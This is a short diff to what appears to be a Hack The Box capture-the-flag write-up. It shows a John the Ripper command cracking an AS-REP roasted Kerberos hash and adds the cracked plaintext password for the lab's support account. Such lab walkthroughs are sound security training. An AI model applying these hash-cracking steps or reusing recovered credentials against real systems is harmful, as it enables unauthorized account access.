@@ -92,3 +92,9 @@ SMB shares reveal two non-default shares named `forensic` and `profiles$`. The s
 ```CSS
 ▶ john krb.hash --format=krb5asrep
 ```
+
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1bd2c405-2c01-48c3-aebe-e3b1b97e88c2)
+
+```CSS
+#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
+```
